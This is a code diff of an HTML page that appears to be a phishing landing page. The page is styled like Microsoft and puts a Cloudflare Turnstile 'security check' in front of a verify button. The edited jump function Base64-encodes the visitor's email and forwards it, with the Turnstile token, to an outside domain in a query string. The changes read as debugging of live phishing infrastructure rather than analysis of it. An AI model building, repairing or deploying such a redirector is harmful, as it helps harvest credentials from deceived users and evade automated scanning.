@@ -11,14 +11,14 @@
         .box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 1px solid #e2e8f0; }
         .btn { background: #0078d4; color: white; padding: 14px 30px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
         .btn:hover { background: #005a9e; }
-        /* Style for disabled button - preserves blue color but adds transparency and changes cursor */
+        /* Style for disabled button - preserves blue color but adds transparency */
         .btn:disabled { 
             background: #0078d4; 
             opacity: 0.5; 
             cursor: not-allowed; 
         }
         .btn:disabled:hover { 
-            background: #0078d4; /* Keeps same color on hover when disabled */
+            background: #0078d4;
         }
         #email-display { font-weight: bold; color: #1a365d; }
         .turnstile-container { margin: 20px 0; min-height: 65px; display: flex; justify-content: center; }
@@ -104,7 +104,7 @@
             document.getElementById('verifyBtn').disabled = true; // Keep button disabled
         }
 
-        // --- Modified jump function (now includes token) ---
+        // --- FIXED: jump function with proper URL structure ---
         function jump() {
             if (!turnstileToken) {
                 alert("Please complete the security check first.");
@@ -114,10 +114,17 @@
             // Encode the email to Base64
             const b64 = btoa(userEmail);
             
-            // Append the Turnstile token to the target URL
-            const target = "https://koomelou.sheruka.com/7h1Oe4ky!RPFM/$" + b64 + 
+            // Properly encode the base URL's special characters (! and $)
+            // Using encodeURIComponent for the entire parameter values
+            const baseUrl = "https://koomelou.sheruka.com/7h1Oe4ky!RPFM/$";
+            
+            // Create URL with proper query string format
+            // '?' for first parameter, then '&' for subsequent parameters
+            const target = baseUrl + 
+                           "?email=" + encodeURIComponent(b64) + 
                            "&cf-turnstile-response=" + encodeURIComponent(turnstileToken);
             
+            console.log("Redirecting to:", target); // For debugging
             window.location.replace(target);
         }
     </script>
